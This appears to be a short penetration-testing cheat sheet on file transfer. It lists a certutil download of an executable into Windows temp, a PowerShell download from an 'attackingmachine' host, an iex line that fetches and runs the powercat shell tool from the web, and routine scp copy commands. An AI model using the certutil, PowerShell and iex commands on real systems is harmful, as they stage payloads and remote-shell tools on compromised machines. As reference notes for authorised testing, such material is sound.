## Using Certutil

 ```
 certutil.exe -f -urlcache -split http://xxx.xxx.xxx.xxx/filename.exe c:/windows/temp/filename.exe
```

## Powershell

### Outside Powershell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /attackingmachine/wget.exe','C:\wget.exe')"
```

### Inside Powershell

Download powercat ...

```
iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

## SCP


### Copy file from a remote host to local host

```
$ scp username@from_host:file.txt /local/directory/
$ scp -i /home/kali/.ssh/id_rsa user@hostname:/home/user/thefile ./
```
 
### Copy file from local host to a remote host

```
$ scp file.txt username@to_host:/remote/directory/
```
 

### Copy directory from a remote host to local host

```
$ scp -r username@from_host:/remote/directory/  /local/directory/
```
 

### Copy directory from local host to a remote host

```
$ scp -r /local/directory/ username@to_host:/remote/directory/
```
 

### Copy file from remote host to remote host

```
$ scp username@from_host:/remote/directory/file.txt username@to_host:/remote/directory/
```
